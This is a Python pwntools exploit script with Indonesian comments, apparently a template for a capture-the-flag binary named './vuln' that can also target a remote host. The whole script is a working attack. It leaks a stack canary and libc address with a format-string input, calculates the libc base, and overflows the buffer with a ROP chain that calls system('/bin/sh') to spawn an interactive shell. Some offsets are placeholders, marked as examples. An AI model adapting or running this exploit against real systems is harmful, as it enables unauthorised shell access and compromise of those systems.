from pwn import *

# === KONFIGURASI ===
exe = './vuln'
elf = ELF(exe)
context.binary = elf

mode = 'local' 

if mode == 'local':
    p = process(exe)
    libc = elf.libc 
else:
    p = remote('10.10.10.10', 1337)
    # libc = ELF('./libc.so.6') # Sesuaikan dengan libc server

# --- FASE 1: LEAK CANARY & LIBC ---
p.recvuntil(b'Enter name:\n')

# Di 64-bit, offset format string biasanya mulai dari 6 atau lebih
# Kita asumsikan %13$p untuk canary dan %15$p untuk leak libc
p.sendline(b'%15$p.%13$p')

leak = p.recvline().strip().split(b'.')
libc_leak = int(leak[0], 16)
canary = int(leak[1], 16)

log.success(f"Leak Libc: {hex(libc_leak)}")
log.success(f"Leak Canary: {hex(canary)}")

# --- FASE 2: HITUNG ALAMAT ---
# Ganti '__libc_start_main' atau 'puts' sesuai dengan apa yang kamu leak
libc.address = libc_leak - (libc.symbols['__libc_start_main'] + 231) # Contoh offset
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

# Cari gadget ROP (Bisa pakai ROPgadget atau fitur pwntools)
# Kita butuh 'pop rdi; ret' untuk masukin /bin/sh ke register RDI
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0] # Untuk stack alignment 16-byte

log.info(f"LIBC Base: {hex(libc.address)}")
log.success(f"Pop RDI Gadget: {hex(pop_rdi)}")

# --- FASE 3: PAYLOAD FINAL (64-BIT) ---
log.info("Fase 3: Mengirim payload final 64-bit...")

# Offset ke canary di 64-bit biasanya lebih besar
offset_to_canary = 64 
payload = b'A' * offset_to_canary
payload += p64(canary)       # Canary (8 byte)
payload += b'B' * 8          # Saved RBP (8 byte)

# ROP Chain 64-bit:
payload += p64(ret_gadget)   # Tambahan 'ret' agar stack align 16-byte (Biar gak crash)
payload += p64(pop_rdi)      # Masuk ke gadget pop rdi
payload += p64(binsh_addr)   # Alamat /bin/sh masuk ke RDI
payload += p64(system_addr)  # Panggil system()

p.recvuntil(b'Enter data:\n')
p.sendline(payload)

# --- FASE 4: INTERAKTIF ---
p.interactive()